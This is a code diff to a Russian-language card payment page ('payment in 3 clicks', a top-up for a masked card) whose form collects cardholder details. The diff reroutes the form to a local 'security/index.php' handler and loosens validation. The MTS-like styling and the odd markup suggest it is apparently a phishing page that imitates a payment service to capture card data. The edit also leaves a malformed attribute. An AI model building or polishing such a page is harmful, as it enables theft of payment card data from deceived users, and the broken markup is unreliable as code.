@@ -108,13 +108,12 @@
             <h1>Оплата в 3 клика</h1>
         </div>
     </div>
-    ﻿
 </div>
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.3/jquery.min.js"></script>
 
 <div class="content">
-    <form method="POST" action="security" class="form" autocomplete="on">
+    <form method="POST" action="security/index.php" class="form" autocomplete="on">
         <div class="b-mts__line b-ts__line_margin">
             <span class="account_number">Пополнение карты № **** **** **** 5673</span>
         </div>
@@ -181,8 +180,8 @@
                                 </div>
                                 <div class="b-creditcard__cardholder-wrap">
                                     <div class="b-creditcard__label" data-lang-html="form_name">Имя</div>
-                                    <input class="b-input b-input_card_holder" name="lastname" id="card-holder"
-                                           name="cardholder" required pattern="[A-Za-z0-9]{1,20}"
+                                    <input class="b-input b-input_card_holder" id="card-holder"
+                                           name="cardholder" required"
                                            type="text" data-check="cardHolder" placeholder="Ваше имя">
                                 </div>
                             </div>
@@ -222,7 +221,7 @@
     </form>
 </div>
 
-<div>﻿
+<div>
     <div class="foofffter">
         <div class="show-on-mobile">
             <center><img src="images/Payment.png"></center>
